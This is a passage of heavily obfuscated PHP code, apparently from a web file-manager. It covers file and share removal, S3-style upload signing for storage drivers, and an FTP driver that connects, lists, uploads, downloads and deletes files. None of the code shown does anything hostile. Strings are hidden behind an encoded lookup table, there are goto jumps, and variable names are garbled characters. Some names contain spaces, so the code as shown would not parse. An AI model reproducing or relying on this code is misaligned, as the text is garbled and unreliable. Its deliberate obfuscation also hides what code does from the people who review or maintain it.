(!$ö„Ğ“Ø¸) { $ıéÒğûç[] = $ùÂğì¦•; $áª›«Åû->updateFileEnd($Ü‘®ÑÒá[$ÙÈÓí³[32]], $Ü‘®ÑÒá[$ÙÈÓí³[79]]); write_log($ÙÈÓí³[2346] . $µî¦³‚“, $ÙÈÓí³[1915]); continue; } $•½¤ÅÊ = array($ÙÈÓí³[545] => $ùÂğì¦•); $ß‹¶£¡ = array($ÙÈÓí³[899] => $İ×²í†Æ, $ÙÈÓí³[87] => $ö„Ğ“Ø¸); Model($ÙÈÓí³[232])->where($•½¤ÅÊ)->save($ß‹¶£¡); } $ ½ªª¯¸ = $áª›«Åû->task; if (!$â¬Êéñå) { Cache::set($±ÉûÏ÷Š, $ ½ªª¯¸); } $áª›«Åû->end(); $‹¹ºğşŸ = array_unique($‹¹ºğşŸ); $ıéÒğûç = array_unique($ıéÒğûç); if (!$â¬Êéñå && ($‹¹ºğşŸ || $ıéÒğûç)) { $‡Á«Ã½á = array(); if ($‹¹ºğşŸ) { $‡Á«Ã½á[] = sprintf(LNG($ÙÈÓí³[2347]), count($‹¹ºğşŸ)); } if ($ıéÒğûç) { $‡Á«Ã½á[] = sprintf(LNG($ÙÈÓí³[2348]), count($ıéÒğûç)); } $‡Á«Ã½á = sprintf(LNG($ÙÈÓí³[2349]), implode($ÙÈÓí³[2350], $‡Á«Ã½á)) . $ÙÈÓí³[2351] . date($ÙÈÓí³[2352]) . $ÙÈÓí³[2353]; if ($£Ó°˜Èù == $ÙÈÓí³[1952]) { $‡Á«Ã½á .= $ÙÈÓí³[2354] . LNG($ÙÈÓí³[2355]); } else { $‡Á«Ã½á = LNG($ÙÈÓí³[2356]) . $ÙÈÓí³[2357] . $‡Á«Ã½á; } $ ½ªª¯¸[$ÙÈÓí³[1275]] = $‡Á«Ã½á; Cache::set($±ÉûÏ÷Š, $ ½ªª¯¸); unset($Š©ÛİÁ½[$ÙÈÓí³[6]]); $Û¡ÂÀêŒ = array($ÙÈÓí³[477] => $ÎÒ¯ ½Ô, $ÙÈÓí³[2226] => $ÙÈÓí³[627], $ÙÈÓí³[32] => $Š©ÛİÁ½[$ÙÈÓí³[32]], $ÙÈÓí³[98] => $Š©ÛİÁ½[$ÙÈÓí³[98]]); Hook::trigger($ÙÈÓí³[1794], array($ÙÈÓí³[1298] => $Û¡ÂÀêŒ, $ÙÈÓí³[1308] => !0)); show_json($‡Á«Ã½á, !1, 100111); } if ($£Ó°˜Èù == $ÙÈÓí³[627]) { return !0; } if ($‹¹ºğşŸ || $ıéÒğûç) { $‚Ê„…€ = array_merge($‹¹ºğşŸ, $ıéÒğûç); $‚Ê„…€ = array_filter(array_unique($‚Ê„…€)); $this->removeByFileID($‚Ê„…€); } if ($Œ»î»¢º) { $Œ»î»¢º = array_filter(array_unique($Œ»î»¢º)); foreach ($Œ»î»¢º as $µî¦³‚“) { $åÄüÔ®… = IO::has($µî¦³‚“, !0); if (!$åÄüÔ®…[$ÙÈÓí³[241]] && !$åÄüÔ®…[$ÙÈÓí³[242]]) { IO::remove($µî¦³‚“); } } } return $this->remove($ÎÒ¯ ½Ô); } private function removeByFileID($² ı’Úì = array()) { $”»¦º’ñ =& $_SERVER[†ûãı«°]; if (empty($² ı’Úì)) { return; } $š›Ùà”Â = array($”»¦º’ñ[545] => array($”»¦º’ñ[7], $² ı’Úì)); $Ç«€ÔŠÙ = Model($”»¦º’ñ[1432])->where($š›Ùà”Â)->field($”»¦º’ñ[193])->select(); if (!$Ç«€ÔŠÙ) { return Model($”»¦º’ñ[548])->remove($² ı’Úì); } $Ç«€ÔŠÙ = array_to_keyvalue($Ç«€ÔŠÙ, $”»¦º’ñ[12], $”»¦º’ñ[193]); foreach ($Ç«€ÔŠÙ as $ŞËìøï) { Model($”»¦º’ñ[906])->removeNow($ŞËìøï, !1); } } private function removeShareItems($ê°Ïİ¬„) { $ØÚŸĞà =& $_SERVER[†ûãı«°]; $‚ñ×ô¼Å = "\173\x69\157\x3a{$ê°Ïİ¬„}\x7d\57"; $éÊ¯µ = array($ØÚŸĞà[193] => 0, $ØÚŸĞà[1268] => array($ØÚŸĞà[461], "{$‚ñ×ô¼Å}\45")); $Å¥˜Ú˜ = Model($ØÚŸĞà[1963])->where($éÊ¯µ)->field($ØÚŸĞà[672])->select(); if (empty($Å¥˜Ú˜)) { return; } $â”ŸÏ«Î = array_to_keyvalue($Å¥˜Ú˜, $ØÚŸĞà[12], $ØÚŸĞà[672]); Model($ØÚŸĞà[671])->remove($â”ŸÏ«Î); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\114\151\x67\150\164\x41\160\160"; public $modelType = "\x53\171\x73\x74\x65\x6d\117\x70\164\x69\x6f\156"; public $field = array("\x6e\141\155\x65", "\147\162\157\x75\160", "\x64\145\163\143", "\143\x6f\156\x74\x65\156\164"); public function listData($½ÍêĞÖŞ = false, $×¤¹½µÚ = "\x6d\157\x64\151\x66\171\124\x69\155\145", $·²—ê®é = true) { return parent::listData($½ÍêĞÖŞ, $×¤¹½µÚ, $·²—ê®é); } public function remove($ØßŞ÷¶Æ) { $‘©ˆàñ¾ = $this->findByName($ØßŞ÷¶Æ); if (!$‘©ˆàñ¾) { return !1; } return parent::remove($‘©ˆàñ¾[$_SERVER[†ûãı«°][477]]); } public function add($ĞÂõû) { if ($this->findByName($ĞÂõû[$_SERVER[†ûãı«°][32]])) { return !1; } return parent::insert($ĞÂõû); } public function update($èË´¾ÈÍ, $ŠÌ¯ç»Ì) { $›±‡ñ©Ã =& $_SERVER[†ûãı«°]; $¶—áâ˜ = $this->findByName($èË´¾ÈÍ); $è‰Â­ü„ = $this->findByName($ŠÌ¯ç»Ì[$›±‡ñ©Ã[32]]); if (!$¶—áâ˜ || $è‰Â­ü„ && $è‰Â­ü„[$›±‡ñ©Ã[477]] != $¶—áâ˜[$›±‡ñ©Ã[477]]) { return !1; } return parent::update($¶—áâ˜[$›±‡ñ©Ã[477]], $ŠÌ¯ç»Ì); } } goto C´ß’”Êç; dÒÌ‡°Şİ©: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($×ƒ²„‹) { parent::__construct($×ƒ²„‹); $this->setSignVersion($_SERVER[†ûãı«°][249]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Åïâ’–) { parent::__construct($Åïâ’–); $this->setSignVersion($_SERVER[†ûãı«°][249]); } public function uploadFormData($¿²ìÃÍ, $Ş•Å·úö = 3600) { $õ‹Àë³Ö =& $_SERVER[†ûãı«°]; $µÈÒÕ‰Ú = $õ‹Àë³Ö[231]; $ü¹úÛèæ = $õ‹Àë³Ö[259]; $•éíƒæ‚ = $õ‹Àë³Ö[62]; $Ø÷€áôş = gmdate($õ‹Àë³Ö[260]); $ÀİÆİ = gmdate($õ‹Àë³Ö[261]); $ûóº«Óú = $õ‹Àë³Ö[262]; $Ç¤ˆô¢¼ = $Ş•Å·úö . $õ‹Àë³Ö[12]; $ĞÇ³‰„ = $õ‹Àë³Ö[263]; $Àº³å“’ = array($this->accessKey, $ÀİÆİ, $this->region, $•éíƒæ‚, $ûóº«Óú); $¡†ˆ¾ = implode($õ‹Àë³Ö[8], $Àº³å“’); $¶ƒ€à€¬ = array($õ‹Àë³Ö[264] => gmdate($õ‹Àë³Ö[1424], strtotime($õ‹Àë³Ö[266])), $õ‹Àë³Ö[267] => array(array($õ‹Àë³Ö[268] => $this->bucket), array($õ‹Àë³Ö[308] => $µÈÒÕ‰Ú), array($õ‹Àë³Ö[269], $õ‹Àë³Ö[270], $õ‹Àë³Ö[12]), array($õ‹Àë³Ö[269], $õ‹Àë³Ö[271], $õ‹Àë³Ö[12]), array($õ‹Àë³Ö[269], $õ‹Àë³Ö[309], $õ‹Àë³Ö[12]), array($õ‹Àë³Ö[272] => $ĞÇ³‰„), array($õ‹Àë³Ö[273] => $¡†ˆ¾), array($õ‹Àë³Ö[274] => $ü¹úÛèæ), array($õ‹Àë³Ö[275] => $Ø÷€áôş), array($õ‹Àë³Ö[276] => $Ç¤ˆô¢¼))); $ìô‹•Ÿ² = base64_encode(json_encode($¶ƒ€à€¬)); $ò½ìõğ = hash_hmac($õ‹Àë³Ö[277], $ÀİÆİ, $õ‹Àë³Ö[278] . $this->secret, !0); $ÉÓş±İ® = hash_hmac($õ‹Àë³Ö[277], $this->region, $ò½ìõğ, !0); $Ä¨‘‡íµ = hash_hmac($õ‹Àë³Ö[277], $•éíƒæ‚, $ÉÓş±İ®, !0); $úßÅÀ÷ = hash_hmac($õ‹Àë³Ö[277], $ûóº«Óú, $Ä¨‘‡íµ, !0); $‘‚§¨•˜ = hash_hmac($õ‹Àë³Ö[277], $ìô‹•Ÿ², $úßÅÀ÷); $–”ìÑØô = array($õ‹Àë³Ö[248] => $õ‹Àë³Ö[12], $õ‹Àë³Ö[296] => $õ‹Àë³Ö[12], $õ‹Àë³Ö[308] => $µÈÒÕ‰Ú, $õ‹Àë³Ö[272] => $ĞÇ³‰„, $õ‹Àë³Ö[279] => $ìô‹•Ÿ², $õ‹Àë³Ö[310] => $¡†ˆ¾, $õ‹Àë³Ö[311] => $ü¹úÛèæ, $õ‹Àë³Ö[312] => $Ø÷€áôş, $õ‹Àë³Ö[313] => $Ç¤ˆô¢¼, $õ‹Àë³Ö[314] => $‘‚§¨•˜, $õ‹Àë³Ö[208] => $this->getHost()); return $–”ìÑØô; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($¹‹çúş) { parent::__construct(); if (count($¹‹çúş) > 0) { $this->_init($¹‹çúş); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($•ˆ›ö¹Ä) { $Æî¶ÉÊ =& $_SERVER[†ûãı«°]; global $config; $this->appCharset = $config[$Æî¶ÉÊ[1450]]; $this->systemCharset = $config[$Æî¶ÉÊ[1451]]; if (isset($•ˆ›ö¹Ä[$Æî¶ÉÊ[1452]]) && $•ˆ›ö¹Ä[$Æî¶ÉÊ[1452]]) { $this->systemCharset = $•ˆ›ö¹Ä[$Æî¶ÉÊ[1452]]; } } public function iconvApp($³û·ƒ) { return $this->iconvTo($³û·ƒ, $this->systemCharset, $this->appCharset); } public function iconvSystem($–‚Áåß) { return $this->iconvTo($–‚Áåß, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ğ¡î³Ã¤) { $ÀåøÎ‰¶ =& $_SERVER[†ûãı«°]; $âµ‘€óÜ = $this->iconvApp($this->pathBase); $Ğ¡î³Ã¤ = $this->iconvApp($Ğ¡î³Ã¤); if (substr($âµ‘€óÜ, 0, 2) == $ÀåøÎ‰¶[1422]) { $âµ‘€óÜ = BASIC_PATH . substr($âµ‘€óÜ, 2); } if (substr($Ğ¡î³Ã¤, 0, 2) == $ÀåøÎ‰¶[1422]) { $Ğ¡î³Ã¤ = BASIC_PATH . substr($Ğ¡î³Ã¤, 2); } $âµ‘€óÜ = KodIO::clear($âµ‘€óÜ); $Ğ¡î³Ã¤ = KodIO::clear($Ğ¡î³Ã¤); $Ğ¡î³Ã¤ = substr($Ğ¡î³Ã¤, strlen($âµ‘€óÜ)); if (empty($this->pathDriver)) { return $Ğ¡î³Ã¤; } return $this->pathDriver . $ÀåøÎ‰¶[8] . ltrim($Ğ¡î³Ã¤, $ÀåøÎ‰¶[8]); } private function _init($¬•É• = array()) { $ÁÇ·ä§ƒ =& $_SERVER[†ûãı«°]; if (!function_exists($ÁÇ·ä§ƒ[1453])) { throw new Exception(LNG($ÁÇ·ä§ƒ[1454])); } $this->config = $¬•É•; $this->charsetReset($¬•É•); foreach ($¬•É• as $æŸ·ùÌ« => $€’Ñ²¢µ) { if (isset($this->{$æŸ·ùÌ«})) { $this->{$æŸ·ùÌ«} = $€’Ñ²¢µ; } } return $this->_login($¬•É•); } private function _login($¹’¼ÎÁ†) { $˜İŠ›©¡ =& $_SERVER[†ûãı«°]; static $‹±Õ·’Ì = array(); $š§¥ĞØ = md5(json_encode($¹’¼ÎÁ†)); if (isset($‹±Õ·’Ì[$š§¥ĞØ])) { foreach ($‹±Õ·’Ì[$š§¥ĞØ] as $¼Úè§” => $“Ì¼‹‡) { $this->{$¼Úè§”} = $“Ì¼‹‡; } return !0; } $‚Šä¼ş– = parse_url(trim($this->server, $˜İŠ›©¡[8])); $this->host = $‚Šä¼ş–[$˜İŠ›©¡[208]]; $ƒ¿ö½˜ = isset($‚Šä¼ş–[$˜İŠ›©¡[207]]) && $‚Šä¼ş–[$˜İŠ›©¡[207]] == $˜İŠ›©¡[1455] ? !0 : !1; $this->scheme = $ƒ¿ö½˜ ? $˜İŠ›©¡[1456] : $˜İŠ›©¡[1457]; $this->port = isset($‚Šä¼ş–[$˜İŠ›©¡[209]]) ? $‚Šä¼ş–[$˜İŠ›©¡[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($˜İŠ›©¡[1458]) . $this->host . $˜İŠ›©¡[4] . $this->port, !0); return !1; } $¿ÒŠ¤€ˆ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$¿ÒŠ¤€ˆ) { $this->writeLog(LNG($˜İŠ›©¡[1459]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $˜İŠ›©¡[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¿ÎÎäüİ = $this->pasv == $˜İŠ›©¡[91] ? !0 : !1; @ftp_pasv($this->connect, $¿ÎÎäüİ); $‹±Õ·’Ì[$š§¥ĞØ] = array($˜İŠ›©¡[1460] => $this->connect, $˜İŠ›©¡[208] => $this->host, $˜İŠ›©¡[207] => $this->scheme, $˜İŠ›©¡[209] => $this->port); return $¿ÒŠ¤€ˆ; } private function _isconn($‚ãğäË = true) { if (is_resource($this->connect)) { return !0; } if (!$‚ãğäË) { return !1; } return $this->_login($this->config); } public function mkfile($ÇÎÏõ‹, $–†ûıŒĞ = '', $¨°ò²§ = REPEAT_RENAME) { if ($this->setContent($ÇÎÏõ‹, $–†ûıŒĞ)) { return $this->getPathOuter($ÇÎÏõ‹); } $this->writeLog(LNG($_SERVER[†ûãı«°][1461]), !0); return !1; } public function mkdir($¨ç˜´´ä, $çäğÁº¨ = REPEAT_SKIP) { $İ°‡¦ =& $_SERVER[†ûãı«°]; if (!$¨ç˜´´ä || $¨ç˜´´ä == $İ°‡¦[8]) { return !0; } if (!$this->_isconn()) { return !1; } $¨ç˜´´ä = $this->iconvSystem($¨ç˜´´ä); if ($this->_isFolder($¨ç˜´´ä) || @ftp_mkdir($this->connect, $¨ç˜´´ä)) { return $this->getPathOuter($¨ç˜´´ä); } if (!$this->mkdir($this->pathFather($¨ç˜´´ä))) { return !1; } if ($¨ç˜´´ä = @ftp_mkdir($this->connect, $¨ç˜´´ä)) { return $this->getPathOuter($¨ç˜´´ä); } $ÚçÆõÓÕ = __FUNCTION__ . $İ°‡¦[1462]; $this->writeLog($ÚçÆõÓÕ, !0); return !1; } public function copyFile($ô‰ûäâÚ, $Ã·ª™ƒ­) { if (!$this->_isconn()) { return !1; } $­á¸Ê›¨ = $this->pathThis($this->iconvSystem($ô‰ûäâÚ)); $ŞÓÍÜ­“ = $this->tempFile($­á¸Ê›¨); $Ó»ø¯ßÛ = $this->iconvApp($ŞÓÍÜ­“); $this->download($ô‰ûäâÚ, $Ó»ø¯ßÛ); $ÀóòÖ³ = $this->upload($Ã·ª™ƒ­, $Ó»ø¯ßÛ); $this->tempFileRemve($ŞÓÍÜ­“); return $ÀóòÖ³; } public function moveFile($ü•ÉªÌƒ, $ãÃ¨ø´ö) { if (!$this->_isconn()) { return !1; } $ü•ÉªÌƒ = $this->iconvSystem($ü•ÉªÌƒ); $ãÃ¨ø´ö = $this->iconvSystem($ãÃ¨ø´ö); $í´ª´‹ = @ftp_rename($this->connect, $ü•ÉªÌƒ, $ãÃ¨ø´ö); if (!$í´ª´‹) { $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][1462], !0); return !1; } return $this->getPathOuter($ãÃ¨ø´ö); } public function delFile($™¿¾‡ ˜) { if (!$this->_isconn()) { return !1; } $™¿¾‡ ˜ = $this->iconvSystem($™¿¾‡ ˜); $°‹„˜ú‹ = @ftp_delete($this->connect, $™¿¾‡ ˜); if (!$°‹„˜ú‹) { $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][1462], !0); } return $°‹„˜ú‹; } public function delFolder($°¸şÑ”¨) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $§ß«õìæ = $€ŞæŞ†Û = array(); $this->fileList($°¸şÑ”¨, $§ß«õìæ, $€ŞæŞ†Û, !0); $this->listItemCache = !0; foreach ($€ŞæŞ†Û as $ö‚òÑµ) { $×ÍÎÚ“Ê = $this->iconvSystem($ö‚òÑµ[$_SERVER[†ûãı«°][32]]); $¡¨Ë¬“„ = @ftp_delete($this->connect, $×ÍÎÚ“Ê); if (!$¡¨Ë¬“„) { return !1; } } foreach ($§ß«õìæ as $×ÍÎÚ“Ê) { $×ÍÎÚ“Ê = $this->iconvSystem($×ÍÎÚ“Ê); $¡¨Ë¬“„ = @ftp_rmdir($this->connect, $×ÍÎÚ“Ê); if (!$¡¨Ë¬“„) { return !1; } } $°¸şÑ”¨ = $this->iconvSystem($°¸şÑ”¨); return @ftp_rmdir($this->connect, $°¸şÑ”¨); } public function rename($Ó…ÎßèÎ, $¬ç’ä) { $³ÙÊÍ =& $_SERVER[†ûãı«°]; if (!$this->_isconn()) { return !1; } $ÌÌğáá = $this->fileNameAuto($this->pathFather($Ó…ÎßèÎ), $¬ç’ä); $ÌÌğáá = $this->iconvSystem($ÌÌğáá); $Ó…ÎßèÎ = $this->iconvSystem($Ó…ÎßèÎ); $ıËåãøí = $this->pathFather($Ó…ÎßèÎ); $öİ½ÊË = rtrim($ıËåãøí, $³ÙÊÍ[8]) . $³ÙÊÍ[8] . $ÌÌğáá; $„Îåğ¤Ã = @ftp_rename($this->connect, $Ó…ÎßèÎ, $öİ½ÊË); if (!$„Îåğ¤Ã) { $this->writeLog(__FUNCTION__ . $³ÙÊÍ[1462], !0); return !1; } $öİ½ÊË = $this->iconvApp($öİ½ÊË); return $this->getPathOuter($öİ½ÊË); } private function folderInfo($ÛÛœşÆ¹, $í‹øş§È = false) { $ù…ó™† =& $_SERVER[†ûãı«°]; $¹­ØÚŸ = array($ù…ó™†[32] => $this->pathThis($ÛÛœşÆ¹), $ù…ó™†[87] => $this->getPathOuter($ù…ó™†[8] . $ÛÛœşÆ¹), $ù…ó™†[33] => $ù…ó™†[78]); if ($í‹øş§È) { return $¹­ØÚŸ; } $¹­ØÚŸ[$ù…ó™†[233]] = $¹­ØÚŸ[$ù…ó™†[88]] = 0; $¹­ØÚŸ[$ù…ó™†[234]] = $¹­ØÚŸ[$ù…ó™†[235]] = !0; return $¹­ØÚŸ; } private function fileInfo($®•¶ü¢…, $¢ˆí› = false, $¯¸Ü¸•Ÿ = array()) { $œì²¸ô§ =& $_SERVER[†ûãı«°]; $Ú­¤Æìˆ = array($œì²¸ô§[32] => $this->pathThis($®•¶ü¢…), $œì²¸ô§[87] => $this->getPathOuter($œì²¸ô§[8] . $®•¶ü¢…), $œì²¸ô§[33] => $œì²¸ô§[232], $œì²¸ô§[79] => isset($¯¸Ü¸•Ÿ[$œì²¸ô§[79]]) ? $¯¸Ü¸•Ÿ[$œì²¸ô§[79]] : 0, $œì²¸ô§[169] => $this->ext($®•¶ü¢…)); if ($¢ˆí›) { return $Ú­¤Æìˆ; } $Ú­¤Æìˆ[$œì²¸ô§[233]] = $Ú­¤Æìˆ[$œì²¸ô§[88]] = 0; $Ú­¤Æìˆ[$œì²¸ô§[234]] = $Ú­¤Æìˆ[$œì²¸ô§[235]] = !0; $¶æïÂ±³ = $this->iconvSystem($®•¶ü¢…); $Ú­¤Æìˆ[$œì²¸ô§[88]] = @ftp_mdtm($this->connect, $¶æïÂ±³); if (empty($¯¸Ü¸•Ÿ)) { $¯¸Ü¸•Ÿ = $this->objectMeta($®•¶ü¢…); if (!$¯¸Ü¸•Ÿ) { return $Ú­¤Æìˆ; } } $Ú­¤Æìˆ[$œì²¸ô§[79]] = $¯¸Ü¸•Ÿ[$œì²¸ô§[79]]; return $Ú­¤Æìˆ; } public function size($ºŒá°¼) { $€¬±§èì = $this->objectMeta($ºŒá°¼); return $€¬±§èì ? $€¬±§èì[$_SERVER[†ûãı«°][79]] : 0; } public function info($éÈä±Â¦) { if ($this->isFile($éÈä±Â¦)) { return $this->fileInfo($éÈä±Â¦, 0); } else { if ($this->isFolder($éÈä±Â¦)) { return $this->folderInfo($éÈä±Â¦); } } return !1; } private function fileList($§¢¥İ³—, &$ƒŸ²úòÚ, &$Õ¬ŞùÃ, $”¶úòşÚ = false) { $¦äøã¬Ø =& $_SERVER[†ûãı«°]; $§¢¥İ³— = $this->iconvSystem($§¢¥İ³—); if (!$this->isFolder($§¢¥İ³—)) { return !1; } $§¢¥İ³— = rtrim($§¢¥İ³—, $¦äøã¬Ø[8]) . $¦äøã¬Ø[8]; check_abort(); $†ìÅ¨Ô„ = @ftp_rawlist($this->connect, $§¢¥İ³—); if (!$†ìÅ¨Ô„) { $†ìÅ¨Ô„ = array(); } $„ŠÜ‹İ£ = array($¦äøã¬Ø[10] => 1, $¦äøã¬Ø[1374] => 1); foreach ($†ìÅ¨Ô„ as $º‚¯ºıñ) { $ÀËÆû¥» = $this->_listItem($º‚¯ºıñ); if ($ÀËÆû¥»[0] == $¦äøã¬Ø[834]) { continue; } $…ùµ¹¦” = $ÀËÆû¥»[8]; if (empty($…ùµ¹¦”) && $…ùµ¹¦” !== $¦äøã¬Ø[230] || isset($„ŠÜ‹İ£[$…ùµ¹¦”])) { continue; } $…ùµ¹¦” = $this->iconvApp($§¢¥İ³— . ltrim($…ùµ¹¦”, $¦äøã¬Ø[8])); $å’¥ĞëÄ = array($¦äøã¬Ø[32] => $…ùµ¹¦”, $¦äøã¬Ø[33] => $¦äøã¬Ø[232], $¦äøã¬Ø[79] => $ÀËÆû¥»[4]); if (substr($º‚¯ºıñ, 0, 1) == $¦äøã¬Ø[1463]) { $å’¥ĞëÄ[$¦äøã¬Ø[33]] = $¦äøã¬Ø[78]; $å’¥ĞëÄ[$¦äøã¬Ø[79]] = 0; } $ ¬Å´ç— = $å’¥ĞëÄ[$¦äøã¬Ø[33]] == $¦äøã¬Ø[78] ? !0 : !1; $this->cacheMethodInfoSet($…ùµ¹¦”, $ ¬Å´ç—, $å’¥ĞëÄ); if ($ ¬Å´ç—) { $ƒŸ²úòÚ[] = $…ùµ¹¦”; if ($”¶úòşÚ) { $this->fileList($…ùµ¹¦”, $ƒŸ²úòÚ, $Õ¬ŞùÃ, $”¶úòşÚ); } continue; } $Õ¬ŞùÃ[] = $å’¥ĞëÄ; } $this->cacheMethodInfoSet($§¢¥İ³—, !0); } private function _listItem($†ğÌùßë) { if (empty($†ğÌùßë)) { return array(); } $ÁÛÔŸõ = preg_split($_SERVER[†ûãı«°][1464], $†ğÌùßë); if (count($ÁÛÔŸõ) <= 9) { return $ÁÛÔŸõ; } $ÁÛÔŸõ[8] = trim(substr($†ğÌùßë, strpos($†ğÌùßë, $ÁÛÔŸõ[7]) + strlen($ÁÛÔŸõ[7]))); return array_splice($ÁÛÔŸõ, 0, 9); } public function listPath($ÌòÅÕ†…, $¯àí§ÁÎ = false) { $ÆƒŒÀÒ =& $_SERVER[†ûãı«°]; if (!$this->_isconn()) { return !1; } $Ììé¢ò = $‡€‹š†ª = array(); $this->fileList($ÌòÅÕ†…, $Ììé¢ò, $‡€‹š†ª); foreach ($Ììé¢ò as $Èü¼ô—™ => $î½Ùò§²) { $Ììé¢ò[$Èü¼ô—™] = $this->folderInfo($î½Ùò§², $¯àí§ÁÎ); } foreach ($‡€‹š†ª as $Èü¼ô—™ => $î½Ùò§²) { $‡€‹š†ª[$Èü¼ô—™] = $this->fileInfo($î½Ùò§²[$ÆƒŒÀÒ[32]], $¯àí§ÁÎ, $î½Ùò§²); } return array($ÆƒŒÀÒ[85] => $Ììé¢ò, $ÆƒŒÀÒ[86] => $‡€‹š†ª); } public function has($­ëï¬ÁŠ, $•üÖÉñú = false, $öåÏÊ×Ó = true) { $Ğ°‡öœş =& $_SERVER[†ûãı«°]; $Æ±Êïë = $ï¹ïƒíÅ = array(); $¿¢ÆÇŠ = $•üÖÉñú ? !0 : !1; $this->fileList($­ëï¬ÁŠ, $Æ±Êïë, $ï¹ïƒíÅ, $¿¢ÆÇŠ); if ($•üÖÉñú) { return array($Ğ°‡öœş[241] => count($ï¹ïƒíÅ), $Ğ°‡öœş[242] => count($Æ±Êïë)); } if ($öåÏÊ×Ó) { if (count($ï¹ïƒíÅ)) { return !0; } } else { if (count($Æ±Êïë)) { return !0; } } return !1; } public function listAll($á¢í×ù‰) { $”å´ßè =& $_SERVER[†ûãı«°]; if (!$this->_isconn()) { return !1; } $ø‹×ôÙÃ = $çÑÏËïá = array(); $this->fileList($á¢í×ù‰, $ø‹×ôÙÃ, $çÑÏËïá, !0); $·„¾÷Öò = array_to_keyvalue($çÑÏËïá, $”å´ßè[32]); foreach ($ø‹×ôÙÃ as $ô¨¬„¸ä) { if (is_string($ô¨¬„¸ä)) { $·„¾÷Öò[$ô¨¬„¸ä] = array($”å´ßè[79] => 0); } } return $this->listAllFiles($á¢í×ù‰, $·„¾÷Öò); } public function getContent($ê©©¢³) { if (!$this->_isconn()) { return !1; } $ê©©¢³ = $this->iconvSystem($ê©©¢³); return $this->fileSubstr($ê©©¢³); } public function setContent($æ…Âİ¼Ş, $‡¸¯Á¦ò = '') { if (!$this->_isconn()) { return !1; } $ê®°‡²Œ = $this->pathThis($this->iconvSystem($æ…Âİ¼Ş)); $‡âƒÉÂá = $this->tempFile($ê®°‡²Œ); file_put_contents($‡âƒÉÂá, $‡¸¯Á¦ò); $Ğ”ÌÃº• = $this->upload($æ…Âİ¼Ş, $this->iconvApp($‡âƒÉÂá)); $this->tempFileRemve($‡âƒÉÂá); return $Ğ”ÌÃº•; } public function fileSubstr($‡î÷Şßä, $§£—ÈÍß = 0, $µÆÖ¬õÜ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($‡î÷Şßä, $§£—ÈÍß, $µÆÖ¬õÜ); } private function ftpRequest($°—Íš¥¹, $˜ùÃŒœ = 0, $¹Ş®ƒ© = false) { $å«Æ²ùØ =& $_SERVER[†ûãı«°]; $°—Íš¥¹ = $å«Æ²ùØ[8] . ltrim(str_ltrim($°—Íš¥¹, $this->ftpPath), $å«Æ²ùØ[8]); $°—Íš¥¹ = $this->iconvSystem($°—Íš¥¹); $¹á = $this->scheme . $this->host . $å«Æ²ùØ[4] . $this->port; $òêÉ ¹é = curl_init(); curl_setopt($òêÉ ¹é, CURLOPT_URL, $¹á . $this->pathEncode($°—Íš¥¹)); curl_setopt($òêÉ ¹é, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¹Ş®ƒ©) { $ÓÑŠşÁÊ = $˜ùÃŒœ + $¹Ş®ƒ© - 1; curl_setopt($òêÉ ¹é, CURLOPT_RANGE, "{$˜ùÃŒœ}\55{$ÓÑŠşÁÊ}"); } curl_setopt($òêÉ ¹é, CURLOPT_RETURNTRANSFER, 1); $´ö²¼ï  = curl_exec($òêÉ ¹é); curl_close($òêÉ ¹é); return $´ö²¼ï ; } public function upload($¤œêµ², $Æ•Ù§–­, $¸Â€Éúô = false, $Àé§òâ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¤œêµ²))) { return !1; } $¤œêµ² = $this->iconvSystem($¤œêµ²); $Æ•Ù§–­ = $this->iconvSystem($Æ•Ù§–­); $¿µ¤ìû‘ = ftp_nb_put($this->connect, $¤œêµ², $Æ•Ù§–­, FTP_BINARY); while ($¿µ¤ìû‘ == FTP_MOREDATA) { $¿µ¤ìû‘ = ftp_nb_continue($this->connect); } if ($¿µ¤ìû‘ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][1462], !0); return !1; } return $this->getPathOuter($¤œêµ²); } public function download($™À²„íª, $ÕûøŒğÉ = '') { if (!$this->_isconn()) { return !1; } $èÍ¿é‡« = $this->pathFather($ÕûøŒğÉ); if (!IO::mkdir($èÍ¿é‡«)) { return !1; } $™À²„íª = $this->iconvSystem($™À²„íª); $ÕûøŒğÉ = $this->iconvSystem($ÕûøŒğÉ); $¢Å›€º = ftp_nb_get($this->connect, $ÕûøŒğÉ, $™À²„íª, FTP_BINARY); while ($¢Å›€º == FTP_MOREDATA) { $¢Å›€º = ftp_nb_continue($this->connect); } if ($¢Å›€º != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[†ûãı«°][1462], !0); return !1; } return $this->iconvApp($ÕûøŒğÉ); } public function exist($ˆèĞ«Àİ) { return $this->isFile($ˆèĞ«Àİ) || $this->isFolder($ˆèĞ«Àİ); } public function isFile($Îº»ü˜) { return !$this->isFolder($Îº»ü˜) && $this->objectMeta($Îº»ü˜); } public function isFolder($Íù‰ªÆ ) { return $this->cacheMethod($_SERVER[†ûãı«°][179], $Íù‰ªÆ ); } protected function objectMeta($úÆõºÅÑ) { return $this->cacheMethod($_SERVER[†ûãı«°][181], $úÆõºÅÑ); } protected function _objectMeta($«Ñº»ø¹) { $ê“¤ğ­ =& $_SERVER[†ûãı«°]; if ($«Ñº»ø¹ == $ê“¤ğ­[12] || $«Ñº»ø¹ == $ê“¤ğ­[8]) { return array(); } if 